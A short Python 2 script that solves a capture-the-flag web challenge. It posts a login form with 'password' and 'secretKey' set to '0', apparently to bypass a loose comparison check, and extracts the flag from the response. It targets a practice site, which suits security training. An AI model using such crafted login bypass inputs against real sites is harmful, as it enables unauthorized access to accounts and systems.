#!/usr/bin/python

import pycurl, StringIO, certifi, re
from urllib import urlencode

url = 'https://ctfs.me/web/web60/'

c = pycurl.Curl()
c.setopt(c.CAINFO, certifi.where())
c.setopt(c.USERAGENT, 'Mozilla/5.0')
c.setopt(c.URL, url)
buff = StringIO.StringIO()
c.setopt(c.WRITEFUNCTION, buff.write)
c.setopt(c.FOLLOWLOCATION, 1)

post_data = {'password': '0',
             'sb': 'Submit Query',
             'secretKey': '0'}

postfields = urlencode(post_data)

c.setopt(c.POST, 1)
c.setopt(c.POSTFIELDS, postfields)
c.perform()

body = buff.getvalue()
flag = re.search('CTFS\{.+\}', body, re.M|re.I)

print "[+] Flag is: " + flag.group()